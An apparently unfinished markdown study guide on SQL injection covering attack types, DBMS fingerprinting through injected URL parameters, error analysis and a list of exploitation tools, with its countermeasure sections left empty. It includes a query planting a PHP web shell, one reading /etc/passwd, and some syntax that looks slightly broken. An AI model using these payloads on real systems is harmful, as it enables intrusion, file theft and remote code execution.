# SQL Injection

## Plan
* [Lexic](#lexic)
* [Overview](#overview) 
   * [Acronyms - Definition](#acronyms---definition)
   * [Exploitability](#exploitability)
   * [Impact](#impact)
   * [Components](#components)
   * [Types](#types) 
* [Vulnerability exploitation samples](#vulnerability-exploitation-samples)
* [How to test for/check SQLi](#how-to-testcheck-for-sqli)
   * [Whitebox](#whitebox)
   * [Graybox](#graybox) 
   * [Blackbox](#blackbox)
* [DBMS fingerprinting](#dbms-fingerprinting)
* [Presence detection](#presence-detection)
* [Countermeasures guidelines](#countermeasures-guidelines)
   * [Server side](#server-side)
   * [Client side](#client-side)
   * [Policies](#policies)
* [Countermeasures implementation](#countermeasures-implementation)
* [Attack scenairio dissect](#attack-scenario-dissect)
* [Common exploitation tools](#common-exploitation-tools) 

# Lexic

# Overview
## Acronyms - Definition
SQL injection stands for Structured Query Laguage injection. It is usually abbreviated as **SQLi**.

It is an attack that consists of insertion or "injection" of a SQL query via the input data from the client to the application.

A successful SQL injection exploit can:
* read sensitive data from the database, 
* modify database data (Insert/Update/Delete), 
* execute administration operations on the database (such as shutdown the DBMS),
* recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. 

## Exploitability
According to OWASP, this kind of attack is an injection attack. Injection attack exploitability is accessible for everyone without special skills. 
But it is necessary to notice that this depends on what kind of SQLi is performing. 
Simple in-Band sqli will be accessible for everyone but blind can be very difficult to exploit and to detect even for skills professional. 


## Impact
An attacker can use SQLi to **bypass authentication or even even impersonate specific users**. 
One of SQL's primary functions is to select primary functions is to select data based on a query and output the reult of that query. An SQL Injection vulnerability could allow `the complete disclosure of data residing on a database server`.
More seriously, SLQi can lead to `Remote Code Execution` or `affects application availability` by deleting its data. 


## Components
The components identification will be based on the image below.
![SQLi components](items/done.png)

### Client tier
The attacker uses a **web browser** to forge malicious SQL queries on a website through the inputs offered by this website.
This query is sent to the **web and application server** for processing. (**Flaw 1 on the image**)

### Web and application server tier
The web and application server receives the prior query. After possible checks and a least of processing, it forwards it to the DBMS entity. (**Flaw 2 on the image**)
Note: The query cannot be run by the web and application server. The DBMS is the entity capable for this. 

### DBMS tier
A DBMS is a Database management system. It has an SQL processing engine. Once the DBMS receives the query it executes the query 
and **possibily** returns the result to the **Web and application server** (**Flaw 3 on the image**). The result **may be** fetched,  formated and sent to the client (web browser). (**Flaw 4 on the image**)

## Types
SQLi could be classified into two majors categories: 
* In-band sqli (classic sqli)
It is the most common and easy way to exploit sqli. This occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. 

** Error based 
It is an in-band sqli that relies on error messages thrown by the db server to obtain information about the structure of the database. 

** Union based sqli 
It is sqli technic that laverages the **Union** sql operator to combine the results of two or more statements into a single result which is then returned as part of the response. 

* Inferential SQLI (Blind SQLi)
It may take longer time for an attacker to exploit. In this, no data is transfered via the web application and the attacker would not be able to see the result of an attack in band. 

** Boolean based sqli 
  This is a technic relies on sending a sql query to the DB which forces the application to return a differnet result depending on wether the query returns a true or false result. Depending on the result, the content within the HTTP response will change or remain the same. This allows an attacker to infer if the payload used returned true or false, even through no data from the database is returned. 	This attack is typically slow (especially on large databases) since an attacker would need to enumerate a database, character by character. 
  
** Time based SQLI 
This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:
If the first letter of the first database's name is an 'A', wait for 10 seconds.
If the first letter of the first database's name is an 'B', wait for 10 seconds. etc. 
  

# Vulnerability explatation samples

## From sqli to RCE 
MySQL provides these functions : 
**load_file** to read file and **INTO FILE** to write a result into a file.
An attacker can write in a file with this kind of sql request 
```sql 
  select "<?php system([$_GET])" INTO FILE cmd.php 
  ```
  And then access to it using ``http://domain.com/cmd.php?maliciouscmd``
  

## SQLi for reading file
With Mysql load_file function, with it an attacker can read a file within this kind of request 
```sql 
   select load_file("/etc/passwd"); 
```


# How to test/check for SQLi
## Whitebox
## Graybox 
## Blackbox
In this section, there two main types of tests that can be performed : manual and logical.
### Logical
This possible thanks to some softwares that do the job and report (and specify) if there are some inputs that SQLi vulnerable.
* SQLiX      
[It](https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project) is a SQL Injection scanner coded in Perl. It is able to:
     * **crawl**, 
     * **detect** SQL injection vectors, 
     * **identify the back-end database**, and 
     * **grab function** call/UDF results (even execute system commands for MS-SQL). 

The concepts in use are different than the one used in other SQL injection scanners. 

[SQLiX](https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project) is able to find **normal and blind SQL injection** vectors and doesn't need to reverse engineer the original SQL request (using only function calls).  

* Acunetix

[It](https://www.acunetix.com/web-vulnerability-scanner/?utm_term=sql%20injection&utm_campaign=38301565&utm_content=&utm_source=Adwords&utm_medium=cpc&gclid=EAIaIQobChMIn73z3-XS2wIVgQvTCh1HMwEHEAAYASAAEgJI6PD_BwE) is commercial tool performing scans on a site pages for SQLi vulnerabilities detection. It is a multi-threaded, lightning fast crawler and scanner that can crawl hundreds of thousands of pages without interruptions.
# DBMS fingerprinting
In a SQLi attack, it is very important to know the nature of the DBMS hidden on the oder side of the server. Therefore, attackers usually use special techniques. The most common are four.

## Banner Grabbing

In this technique, we an retrieve the Backend DBMS banner. In some cases, it may have been replaced by the system administrator.
This technique lays on some SQL statements:
* MS SQL: `SELECT @@version`
* MySQL/MariaDB: `SELECT version()`
* Oracle: `SELECT version FROM v$instance`
* Postgres: `SELECT version()`

## Fingerprinting with string concatenation
In the case, the banner has been replaced by the administrator for example. Another method consists in using the concatenation handling operators to determine the DBMS.
* MS SQL: `'a' + 'a'`
* MySQL/MariaDB: `CONCAT('a','a')`
* Oracle: `'a' || 'a' or CONCAT('a','a')`
* Postgres: `'a' || 'a'`

As we can see both `Oracle` and `Postgres` use the **||** operator to perform such a concatenation, so we need another difference to distinguish them.

`PL/SQL` define the `CONCAT` operator as well to perform string concatenation and as you can guess this one is not defined on `Postgres`. 

## Example:

Let say you're testing the following URL: `http://www.example.com/news.php?id=1`

We checked that the above URL is vulnerable to a Blind SQL Injection. It means that `http://www.example.com/news.php` return back the same contents with both

`id=1 (http://www.example.com/news.php?id=1)`

and

`id=1 AND 1=1 (http://www.example.com/news.php?id=1 AND 1=1)`

We know that different engine have different operators to perform string concatenation as well so all we have to do is to compare the orginal page (`id=1`) with:

* MS SQL: `id=1 AND 'aa'='a'+'a'`
The following comparison should be true:

`http://www.example.com/news.php?id=1''`

`http://www.example.com/news.php?id=1 AND 'aa'='a'+'a'''`

* MySQL/MariaDB/Oracle: `id=1 AND 'aa'=CONCAT('a','a')`

The following comparison should be true:

`http://www.example.com/news.php?id=1`

`http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')`

* Oracle/Postgres: `id=1 AND 'a'='a'||'a'`

The following comparison should be true:

`http://www.example.com/news.php?id=1`

`http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')`

`http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'`

* Postgres:

The following comparison should be true:

`http://www.example.com/news.php?id=1`

`http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'`

## Fingerprinting through SQL Dialiect Injection

Each DBMS extends Standart SQL with a set of native statements. Such a set define a SQL Dialect available to develipers to preoperly query a backend DBMS engine. Beside of lack of portability, this flaw gives a way to accurately fingerprint a DBMS through a SQLi, or even better a SQL Dialect Injection. SQL Dialect Injection is an attack vector where only statements, operators and peculiarities of a SQL Dialect are used in a SQLi.
As an example what does `SELECT 1/0` returns  on different DBMS?
* MySQL: `NULL`
* Oracle: `ORA-00923: FROM keyword not found where expected`
* Postgres: `ERROR: division by zero`
* SQL Server: `Server: Msg 8134, Level 16, State 1, Line 1 Divide by zero error encountered`

We can exploit this peculiarities to identify MySQL DBMS. To accomplish this task the following comparison shall be true:
```
http://www.example.com/news.php?id=1 
http://www.example.com/news.php?id=1 AND ISNULL(1/0)
```

Let see more about this fingerprinting technique. 

* MySQL/MariaDB:
One of MySQL peculiarities is that when a comment block ('/**/') contains an exlamation mark ('/*! sql here*/') it is interpreted by MySQL, and is considered as a normal comment block by other DBMS.

So, if you determine that `http://www.example.com/news.php?id=1` is vulnerable to a BLIND SQL Injection the following comparison should be `'TRUE`:
```
 http://www.example.com/news.php?id=1
 http://www.example.com/news.php?id=1 AND 1=1--
 ```

When backend engine is MySQL following WEB PAGES should contains the same content of vulnerable URL

`http://www.example.com/news.php?id=1 /*! AND 1=1 */--`

on the other side the following should be completely different:

`http://www.example.com/news.php?id=1 /*! AND 1=0 */--`

* PostgreSQL:

Postgres define the :: operator to perform data casting. It means that `1` as `INT` can be convert to `1` as `CHAR` with the following statements:

`SELECT 1::CHAR`

So, if you determine that `http://www.example.com/news.php?id=1` is vulnerable to a BLIND SQL Injection the following comparison should be true when backend engine is PostgreSQL:
```
 http://www.example.com/news.php?id=1
 http://www.example.com/news.php?id=1 AND 1=1::int
```

MS SQL Server: `T-SQL` adds `TOP` expression for `SELECT` statements in order to upper limit retrieved result set:

`SELECT TOP 10 FROM news`

The following comparison should be true on MS SQL:
```
http://www.example.com/news.php?id=1
http://www.example.com/news.php?id=1 UNION ALL SELECT TOP 1 NULL,NULL 
```

* Oracle:

Oracle implements the following set operators:
```
* UNION 
* UNION ALL
* INTERSECT
* MINUS
```
`MINUS` has not yet been implemented on other DBMS so we can inject it to see if it get executed by backend database with no errors at all.

- /news.php?id=1 is vulnerable to SQL Injection
- through UNION SQL INJECTION we determine how many expression are retrieved from news.php to the backend DBMS
- replace UNION with MINUS to see if you get back original page (/news.php?id=1)

```
http://www.example.com/news.php?id=1
http://www.example.com/news.php?id=1 UNION ALL SELECT NULL FROM DUAL
http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL FROM DUAL
http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL,NULL FROM DUAL
http://www.example.com/news.php?id=1 MINUS SELECT NULL,NULL,NULL FROM DUAL
```

## Error Codes Analysis

By performing fault injection, or fuzzing, we can gather important information through error code analysis when web application framework reports errors. Let'see some examples: 
```
http://www.example.com/store/findproduct.php?name='

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version 
for the right syntax to use near '''''   at line 1
```

```
http://www.example.com/store/products.php?id='

Warning: pg_exec() [function.pg-exec]: Query failed: ERROR: unterminated quoted string at or near "'" LINE 1: 
SELECT * FROM products WHERE ID=' ^ in /var/www/store/products.php on line 9
```

## Retrieve the database scheme with sqli 

INFORMATION_SCHEMA is a database within each MySQL instance, the place that stores information about all the other databases that the MySQL server maintains. The INFORMATION_SCHEMA database contains several read-only tables. They are actually views, not base tables, so there are no files associated with them, and you cannot set triggers on them. Also, there is no database directory with that name. 

 Here is an example of a statement that retrieves information from INFORMATION_SCHEMA: 
 ```sql 
 SELECT table_name, table_type, engine
       FROM information_schema.tables
       WHERE table_schema = 'db5'
       ORDER BY table_name;

```

| table_name | table_type | engine |
|------------|:-----------:|------:|
| fk         | BASE TABLE | InnoDB |
| fk2        | BASE TABLE | InnoDB |
| goto       | BASE TABLE | MyISAM |
| into       | BASE TABLE | MyISAM |
| k          | BASE TABLE | MyISAM |
| kurs       | BASE TABLE | MyISAM |
| loop       | BASE TABLE | MyISAM |
| pk         | BASE TABLE | InnoDB |
| t          | BASE TABLE | MyISAM |
| t2         | BASE TABLE | MyISAM |
| t3         | BASE TABLE | MyISAM |
| t7         | BASE TABLE | MyISAM |
| tables     | BASE TABLE | MyISAM |
| v          | VIEW       | NULL   |
| v2         | VIEW       | NULL   |
| v3         | VIEW       | NULL   |
| v56        | VIEW       | NULL   |

17 rows in set (0.01 sec)

Above a result of querying on **information_schema.tables** which shows all the tables in database. 


# Presence detection
# Countermeasures guidelines
## Server side
## Client side
There is nothing to do by the client as it is not able to run SQL queries and is not a recepient of those queries.

In SQLi, the Client is the **attacker and not the victim**.
## Policy(ies)

# Countermeasures implementation
# Common exploitation tools

* SQLninja

[SQLninja](http://sqlninja.sourceforge.net/) is a SQL injection tool that exploits web applications that use a SQL server as a database server. This tool may not find the injection place at first. But if it is discovered, it can easily automate the exploitation process and extract the information from the database server.

* BSQL Hacker

[BSQL hacker](http://resources.infosecinstitute.com/best-free-and-open-source-sql-injection-tools/#download) is a nice SQL injection tool that helps you perform a SQL injection attack against web applications. This tool is for those who want an automatic SQL injection tool. It is especially made for Blind SQL injection. This tool is fast and performs a multi-threaded attack for better and faster results.

* Safe3 SQL Injector

[Safe3 SQL Injector](http://sourceforge.net/projects/safe3si/) is another powerful but easy to use SQL injection tool. Like other SQL injection tools, it also makes the SQL injection process automatic and helps attackers in gaining the access to a remote SQL server by exploiting the SQL injection vulnerability. It has a powerful AI system which easily recognizes the database server, injection type and best way to exploit the vulnerability.

* Mole

[Mole](http://sourceforge.net/projects/themole/files/) or (The Mole) is an automatic SQL injection tool available for free. This is an open source project hosted on Sourceforge. You only need to find the vulnerable URL and then pass it in the tool. This tool can detect the vulnerability from the given URL by using Union based or Boolean based query techniques. This tool offers a command line interface, but the interface is easy to use. It also offers auto-completion on both commands and command arguments. So, you can easily use this tool.

* SQLmap

[SQLmap](https://github.com/sqlmapproject/sqlmap) is probably the most complete and efficient tool for SQLi vulnerabilities exploitation and even more.

The open source software is run at the command line and is available to download for different operating systems: **Linux** distributions, Windows and Mac OS operating systems.

Sqlmap has full support for multiple DBMSs including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird and SAP MaxDB.

And full support for all injection techniques: Boolean, Error, Stack, Time, Union.

* SQLSus 

[SQLSus](http://sqlsus.sourceforge.net/) is another open source SQL injection tool and is basically a MySQL injection and takeover tool. This tool is written in Perl and you can extend the functions by adding your own codes. This tool offers a command interface which lets you inject your own SQL queries and perform SQL injection attacks.


# Related attacks 
